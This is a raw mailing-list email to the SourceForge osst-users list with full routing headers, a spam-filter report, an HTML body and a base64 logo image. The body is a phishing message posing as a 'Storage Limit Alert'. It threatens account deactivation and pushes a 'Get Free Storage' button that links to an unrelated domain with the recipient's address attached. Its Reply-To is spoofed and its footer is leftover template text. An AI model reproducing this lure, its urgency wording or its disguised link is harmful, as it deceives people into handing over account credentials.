Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 947D9B3534D
	for <lists+osst-users@lfdr.de>; Tue, 26 Aug 2025 07:28:51 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=3Jkj+nu3u0c5RyVdcCiLG2rNXGr4i68ILz0CsmRIGw8=; b=NFSOEDLILGVeafPjiG1Gl1fHc6
	hpWz2J52mYZ9XKZTxgd9vZA4+QhgFSs1R4C2Kejl8JP6Il1vG0yHDyIEM08yqf0zo2at0R1gwF2HU
	yTC/DvS3zVYX/AwIeCz4E6IlbwOmDpARa+80qEcEHzOCf8pWCskZI/IX7I+tJt+JEfAI=;
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uqmEk-0005WM-EQ
	for lists+osst-users@lfdr.de;
	Tue, 26 Aug 2025 05:28:50 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <olivia.waxman@time.com>) id 1uqmEj-0005WF-5A
 for osst-users@lists.sourceforge.net; Tue, 26 Aug 2025 05:28:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=x9+ebZtH+TswfFj0/i3sptWJaA34U4SpUfSu+etqHqs=; b=GkkO+Uu8bKnLGXqzARb0UOsjBg
 zNnkEemtArdcGsrC5vOB8+U8Serr7cJHE4ouUYnhVdPVvRFjpGNQPu6g8PZ9aKnDA1r0sn+fRv6tB
 nDmo3nImDuPckXB0qqflhooxp2idM87uUP3bXO5fI9wjaHPAu2uP/CTSETjlgWdN2YJU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=x9+ebZtH+TswfFj0/i3sptWJaA34U4SpUfSu+etqHqs=; b=e
 H4cy6DEncj/RsqCcvBm15rHAAH9BWJarLMi+Jbkm4+Z1Fb2bQnUsOQ0Sj43SicO4rPfUhVVj1hESK
 gryRzUbaQG9NYgEWCzWABNyENfnXyXOTkJ7XgiptanSgbqUw11lPU9fshyVGEP83GXdkZO6Ccp13a
 IkT5k3bTa2ih1rpo=;
Received: from [108.170.60.190] (helo=vm-87427.veeblehosting.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1uqmEi-0005GT-HV for osst-users@lists.sourceforge.net;
 Tue, 26 Aug 2025 05:28:49 +0000
Received: from 120.106.211.173.rdns.colocationamerica.com (localhost
 [127.0.0.1])
 by vm-87427.veeblehosting.com (8.14.7/8.14.7) with ESMTP id 57Q5SbXB029633
 for <osst-users@lists.sourceforge.net>; Tue, 26 Aug 2025 01:28:38 -0400
To: osst-users@lists.sourceforge.net
Date: 26 Aug 2025 05:28:37 -0700
Message-ID: <20250826052837.7811B5ED0E6121F4@time.com>
MIME-Version: 1.0
X-Spam-Score: 2.3 (++)
X-Spam-Report: Spam detection software,
 running on the system "sfi-spamd-1.hosts.colo.sdot.me", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Storage Limit Alert Dears osst-users@lists.sourceforge.net, 
 Your account is approaching its storage capacity. Once your storage is full,
 your account may be deactivated, and access to your data could be disrupted.
 Content analysis details:   (2.3 points, 5.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 T_MXG_EMAIL_FRAG       BODY: URI with email in fragment
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.9 TO_NO_BRKTS_HTML_IMG   To: lacks brackets and HTML and one image
X-Headers-End: 1uqmEi-0005GT-HV
Subject: [Osst-users] Account Notice: Storage Limit Reached
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net via Osst-users" <osst-users@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net" <olivia.waxman@time.com>
Content-Type: multipart/mixed; boundary="===============6855534172323742992=="
Errors-To: osst-users-bounces@lists.sourceforge.net


--===============6855534172323742992==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_DFE78D2B.F52ED73E"


------=_NextPart_000_0012_DFE78D2B.F52ED73E
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><div class=3D"header" style=3D'padding: 24px 30px; color: rgb(255, 25=
5, 255); text-transform: none; text-indent: 0px; letter-spacing: normal; fo=
nt-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; font-size: 22px=
; font-style: normal; font-weight: 600; word-spacing: 0px; white-space: nor=
mal; orphans: 2; widows: 2; background-color: rgb(11, 61, 145); font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial;'><img width=3D"150" height=3D"151" style=3D"w=
idth: 34px; height: 25px;" src=3D"cid:download.jpg">&nbsp;Storage Limit Ale=
rt<div class=3D"content" style=3D'padding: 30px; color: rgb(45, 45, 45); te=
xt-transform: none; line-height: 1.6; text-indent: 0px; letter-spacing: nor=
mal; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; font-siz=
e: medium; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;'><p style=3D"margin: 0px 0px 15px;=
">Dears osst-users@lists.sourceforge.net,</p><p style=3D"margin: 0px 0px 15=
px;">Your account is approaching its storage capacity. Once your storage is=
 full, your account may be deactivated, and access to your data could be di=
srupted.</p><p style=3D"margin: 0px 0px 15px;">To ensure continuous access =
and avoid any service interruption, we&#8217;re offering you some<span>&nbs=
p;</span><strong>extra free storage</strong>.</p><div class=3D"button-conta=
iner" style=3D"margin: 30px 0px; text-align: center;"><a style=3D"text-deco=
ration: none;" href=3D"https://kongracticolimtaliaofusis.com/?email=3Dosst-=
users@lists.sourceforge.net"><a class=3D"button" style=3D"padding: 14px 28p=
x; border-radius: 5px; transition:background-color 0.3s; color: rgb(255, 25=
5, 255); font-size: 16px; font-weight: 500; text-decoration: none; display:=
 inline-block; background-color: rgb(0, 91, 181);" href=3D"https://kongract=
icolimtaliaofusis.com/#osst-users@lists.sourceforge.net">Get Free Storage</=
a></a></div><p style=3D"margin: 0px 0px 15px;">If you have any questions or=
 need assistance, our support team is here to help.</p></div><div class=3D"=
footer" style=3D'padding: 20px 30px; text-align: center; color: rgb(119, 11=
9, 119); text-transform: none; text-indent: 0px; letter-spacing: normal; fo=
nt-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; font-size: 13px=
; font-style: normal; font-weight: 400; word-spacing: 0px; border-top-color=
: rgb(224, 224, 224); border-top-width: 1px; border-top-style: solid; white=
-space: normal; orphans: 2; widows: 2; background-color: rgb(249, 250, 252)=
; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
: initial; text-decoration-color: initial;'>&copy; 2025 Your Company Name &=
middot;<span>&nbsp;</span><a style=3D"color: rgb(0, 115, 230); text-decorat=
ion: none;" href=3D"https://yourcompany.com/support">Contact Support</a></d=
iv></div><div class=3D"footer" style=3D'padding: 20px 30px; text-align: cen=
ter; color: rgb(119, 119, 119); text-transform: none; text-indent: 0px; let=
ter-spacing: normal; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans=
-serif; font-size: 13px; font-style: normal; font-weight: 400; word-spacing=
: 0px; border-top-color: rgb(224, 224, 224); border-top-width: 1px; border-=
top-style: solid; white-space: normal; orphans: 2; widows: 2; background-co=
lor: rgb(249, 250, 252); font-variant-ligatures: normal; font-variant-caps:=
 normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial=
; text-decoration-style: initial; text-decoration-color: initial;'>&copy; 2=
025 Your Company Name &middot;<span>&nbsp;</span><a style=3D"color: rgb(0, =
115, 230); text-decoration: none;" href=3D"https://yourcompany.com/support"=
>Contact Support</a></div></body></html>
------=_NextPart_000_0012_DFE78D2B.F52ED73E
Content-Type: image/jpeg; name="download.jpg"
Content-Transfer-Encoding: base64
Content-ID: <download.jpg>
Content-Disposition: inline; filename="download.jpg"

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
